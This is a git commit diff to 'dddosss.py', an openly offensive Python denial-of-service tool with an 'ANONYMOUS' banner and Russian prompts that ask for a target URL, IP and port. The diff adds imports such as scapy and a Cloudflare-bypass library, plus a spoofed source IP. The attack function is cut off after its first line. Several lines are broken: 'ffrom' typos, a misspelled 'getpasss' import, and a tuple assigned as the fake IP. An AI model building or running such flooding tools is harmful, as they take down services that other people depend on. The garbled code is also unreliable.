c185f175a93ceee678381953fa54d2d7005720b9
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-28 12:58:03 +0300

    Update dddosss.py

--- dddosss.py
+++ dddosss.py
@@ -1,30 +1,47 @@
+#Colour
+yellow='\033[93m'
+gren='\033[92m'
+cyan='\033[96m'
+pink='\033[95m'
+red='\033[91m'
+b='\033[1m'
+##############
 import threading
 from threading import Thread, Timer
 import requests
 from concurrent.futures import ThreadPoolExecutor
 from random import choice, randint
 from socket import socket, AF_INET, SOCK_STREAM, error
-from time import sleep
+import sys, glob, time, requests, ssl, webbrowser
+import bz2, datetime, wget, json, cfscrape, urllib3
+ffrom colorama import Fore
+ffrom time import sleep
+import base64 as b64
+from scapy.all import *
 import socket, threading
 from threading import Thread
+from random import randint
 import random
+import getpasss
+import re
+import cfscrape
 import time
 import socket
 import os, sys
 
 os.system("clear")
-print("""
-         __      ANONYMOUS       _____
-        / /  __ _ _   _  ___ _  |___  |
-       / /  / _` | | | |/ _ \ '__| / /
-      / /__| (_| | |_| |  __/ |   / /
-      \____/\__,_|\__, |\___|_|  /_/
-                  |___/
-              ADDED NEW METHOD 
-              Atacando porta 💥
+print("""\033[93m
+              ANONYMOUS
+      ╭━━━╮     ╭╮ ╭━━━╮
+      ┃╭━━╯     ┃┃ ╰╮╭╮┃
+      ┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
+      ┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
+      ┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.3
+      ╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
+         Разнеси всех и вся 💥
 """)
 
-time.sleep(3.5)
+time.sleep(2.5)
 #########################################################################
 # IMPORT MODULE
 import os, sys, socket, threading, random
@@ -34,20 +51,28 @@ def clear():
 	os.system('cls' if os.name=='nt' else 'clear')
 #########################################################################
 #ip
-url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
+print("\033[31m ╔═══\033[33m[ Введите [URL] Получите [IP] ] •")
+url = input("\033[31m ┗━━━━━━\033[92m•> \033[0m")
 url_chek =requests.get(url)
 ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
+print("\033[31m ╔═══\033[33m[ Ваша Цель [IP] ] •")
+print("\033[92m v \033[0m")
 print(ip)
+time.sleep(0.5)
 #########################################################################
 # MAIN MENU 
 print()
-target = str(input("\033[94m╔═══\033[91m[ IP ] •\n\033[94m╠══>\033[0m "))
-port = int(input("\033[94m╠═══\033[91m[ PORT ] •\n\033[94m╠══>\033[0m "))
+print("\033[31m ╔═══\033[33m[ Ваша Цель [IP] ] •")
+target = str(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
+time.sleep(0.5)
+print("\033[31m ╔═══\033[33m[ PORT ] •")
+port = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
+time.sleep(0.5)
 clear()
-print("\033[94m")
+print("\033[93m")
 #########################################################################
 
-fake_ip = '77.109.33.232'
+fake_ip = '77.109.33.232','127.0.0.1'
 
 def attack():
     while True:
